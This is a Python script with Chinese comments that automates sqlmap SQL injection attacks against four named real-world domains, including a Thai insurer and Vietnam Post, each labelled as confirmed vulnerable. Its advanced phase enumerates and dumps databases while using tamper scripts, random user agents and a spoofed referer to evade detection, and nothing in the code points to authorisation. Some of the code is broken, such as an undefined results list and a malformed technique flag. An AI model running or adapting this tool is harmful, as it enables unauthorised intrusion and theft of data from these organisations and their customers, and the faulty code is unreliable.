#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLMap专属漏洞扫描工具
SQLMap Specialized Vulnerability Scanner

使用sqlmap进行专业的SQL注入漏洞验证
"""

import subprocess
import json
import os
from datetime import datetime
from pathlib import Path

class SQLMapSpecializedScanner:
    def __init__(self):
        self.sqlmap_results = []

        # 确认的SQL注入目标
        self.sql_targets = [
            {
                "name": "ThaiVivat",
                "url": "https://thaivivat.co.th",
                "confirmed_sql_injection": True,
                "priority": "CRITICAL"
            },
            {
                "name": "CM Cooperative",
                "url": "https://cmcoop.or.th",
                "confirmed_sql_injection": True,
                "priority": "CRITICAL"
            },
            {
                "name": "Mun Saving",
                "url": "https://munsaving.com",
                "confirmed_sql_injection": True,
                "priority": "CRITICAL"
            },
            {
                "name": "VN Post",
                "url": "https://vnpost.vn",
                "confirmed_sql_injection": True,
                "priority": "HIGH"
            }
        ]

    def run_sqlmap_scan(self, target):
        """运行sqlmap扫描"""
        print(f"[*] 开始SQLMap扫描: {target['name']}")

        # 基础扫描命令
        cmd = [
            "sqlmap",
            "-u", target["url"],
            "--batch",  # 自动回答所有问题
            "--random-agent",  # 随机User-Agent
            "--level=3",  # 扫描级别3
            "--risk=3",   # 风险等级3
            "--dbs",      # 枚举数据库
            "--threads=3", # 线程数
            "--timeout=30", # 超时时间
            "--tamper=space2comment"  # 注入混淆
        ]

        # 添加参数扫描
        cmd.extend([
            "--technique=B,--Q,S,T,U",  # 基础、报错、时间、联合查询、堆叠查询
            "--forms",  # 扫描表单
            "--crawl=2"  # 爬深度2
        ])

        try:
            print(f"[CMD] {' '.join(cmd)}")

            # 运行sqlmap
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )

            scan_result = {
                "target": target,
                "command": " ".join(cmd),
                "stdout": result.stdout,
                "stderr": result.stderr,
                "return_code": result.returncode,
                "timestamp": datetime.now().isoformat(),
                "vulnerabilities": []
            }

            # 分析结果
            if result.returncode == 0:
                if "is vulnerable" in result.stdout or "seems to be injectable" in result.stdout:
                    scan_result["vulnerabilities"].append("SQL注入漏洞确认")
                if "databases found" in result.stdout:
                    scan_result["vulnerabilities"].append("数据库枚举成功")
                if "columns found" in result.stdout:
                    scan_result["vulnerabilities"].append("列信息获取成功")

            scan_results.append(scan_result)

            return scan_result

        except subprocess.TimeoutExpired:
            print(f"[!] 扫描超时: {target['name']}")
            return None
        except Exception as e:
            print(f"[!] 扫描失败: {e}")
            return None

    def run_advanced_sqlmap_scan(self, target):
        """运行高级sqlmap扫描"""
        print(f"[+] 开始高级SQLMap扫描: {target['name']}")

        # 高级扫描命令
        cmd = [
            "sqlmap",
            "-u", target["url"],
            "--batch",
            "--random-agent",
            "--level=5",
            "--risk=3",
            "--dbs",
            "--tables",
            "--columns",
            "--dump",
            "--threads=5",
            "--timeout=45",
            "--tamper=space2comment,randomcase,between",
            "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "--headers=Accept: */*",
            "--referer=https://www.google.com",
            "--proxy=http://127.0.0.1:8080" if os.path.exists("proxy.txt") else None
        ]

        # 移除None值
        cmd = [x for x in cmd if x is not None]

        try:
            print(f"[CMD] {' '.join(cmd)}")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=600
            )

            scan_result = {
                "target": target,
                "command": " ".join(cmd),
                "stdout": result.stdout,
                "stderr": result.stderr,
                "return_code": result.returncode,
                "timestamp": datetime.now().isoformat(),
                "vulnerabilities": []
            }

            # 分析高级扫描结果
            if result.returncode == 0:
                if any(keyword in result.stdout for keyword in ["is vulnerable", "seems to be injectable"]):
                    scan_result["vulnerabilities"].append("SQL注入漏洞确认")
                if "databases found" in result.stdout:
                    scan_result["vulnerabilities"].append("数据库枚举成功")
                if "tables found" in result.stdout:
                    scan_result["vulnerabilities"].append("表名枚举成功")
                if "columns found" in result.stdout:
                    scan_result["vulnerabilities"].append("列名枚举成功")
                if "dumped" in result.stdout:
                    scan_result["vulnerabilities"].append("数据转储成功")

            return scan_result

        except subprocess.TimeoutExpired:
            print(f"[!] 高级扫描超时: {target['name']}")
            return None
        except Exception as e:
            print(f"[!] 高级扫描失败: {e}")
            return None

    def run_sqlmap_specific_injection(self, target):
        """运行特定注入点扫描"""
        print(f"[+] 特定注入点扫描: {target['name']}")

        # 常见的注入参数
        injection_params = [
            ("id", "'"),
            ("q", "'"),
            ("search", "'"),
            ("username", "'"),
            ("password", "'"),
            ("email", "'"),
            ("phone", "'"),
            ("code", "'"),
            ("param", "'"),
            ("data", "'")
        ]

        results = []

        for param, payload in injection_params:
            cmd = [
                "sqlmap",
                "-u", target["url"],
                "-p", param,
                "--batch",
                "--random-agent",
                "--level=3",
                "--risk=2",
                "--technique=B,--Q,S,T,U",
                "--threads=2",
                "--timeout=20"
            ]

            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=60
                )

                if result.returncode == 0 and any(keyword in result.stdout for keyword in ["is vulnerable", "seems to be injectable"]):
                    results.append({
                        "parameter": param,
                        "vulnerable": True,
                        "details": result.stdout[:500]  # 截取前500字符
                    })

            except subprocess.TimeoutExpired:
                pass
            except Exception:
                pass

        return results

    def generate_sqlmap_report(self, results):
        """生成SQLMap扫描报告"""
        print("\n" + "="*60)
        print("SQLMap专属漏洞扫描报告")
        print("SQLMap Specialized Vulnerability Report")
        print("="*60)

        total_targets = len(results)
        vulnerable_targets = len([r for r in results if r["vulnerabilities"]])

        print(f"总扫描目标: {total_targets}")
        print(f"存在漏洞目标: {vulnerable_targets}")
        print(f"漏洞比例: {vulnerable_targets/total_targets*100:.1f}%")

        for result in results:
            print(f"\n目标: {result['target']['name']}")
            print(f"URL: {result['target']['url']}")
            print(f"状态码: {result['return_code']}")
            print(f"扫描时间: {result['timestamp']}")

            if result["vulnerabilities"]:
                print("[!] 发现的漏洞:")
                for vuln in result["vulnerabilities"]:
                    print(f"  - {vuln}")
            else:
                print("[+] 未发现明显漏洞")

        return {
            "timestamp": datetime.now().isoformat(),
            "total_targets": total_targets,
            "vulnerable_targets": vulnerable_targets,
            "results": results,
            "summary": f"扫描完成，共发现{vulnerable_targets}个存在SQL注入漏洞的目标"
        }

    def save_results(self, results):
        """保存扫描结果"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"sqlmap_specialized_scan_{timestamp}.json"

        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, ensure_ascii=False, indent=2)
            print(f"[+] 结果已保存: {filename}")
            return filename
        except Exception as e:
            print(f"[!] 保存失败: {e}")
            return None

    def run_complete_sqlmap_scan(self):
        """运行完整的SQLMap扫描"""
        print("="*60)
        print("SQLMap专属漏洞扫描器")
        print("SQLMap Specialized Vulnerability Scanner")
        print("="*60)

        results = []

        # 第一阶段：基础扫描
        print("\n[第一阶段] 基础SQL注入扫描")
        for target in self.sql_targets:
            result = self.run_sqlmap_scan(target)
            if result:
                results.append(result)

        # 第二阶段：高级扫描
        print("\n[第二阶段] 高级漏洞扫描")
        for target in self.sql_targets:
            result = self.run_advanced_sqlmap_scan(target)
            if result:
                results.append(result)

        # 第三阶段：特定注入点扫描
        print("\n[第三阶段] 特定注入点扫描")
        for target in self.sql_targets:
            injection_results = self.run_sqlmap_specific_injection(target)
            if injection_results:
                results.append({
                    "target": target,
                    "type": "specific_injection_points",
                    "results": injection_results,
                    "timestamp": datetime.now().isoformat()
                })

        # 生成报告
        report = self.generate_sqlmap_report(results)

        # 保存结果
        saved_file = self.save_results(report)

        print("\n[+] SQLMap扫描完成！")
        return report

def main():
    """主函数"""
    scanner = SQLMapSpecializedScanner()
    report = scanner.run_complete_sqlmap_scan()

    return report

if __name__ == "__main__":
    main()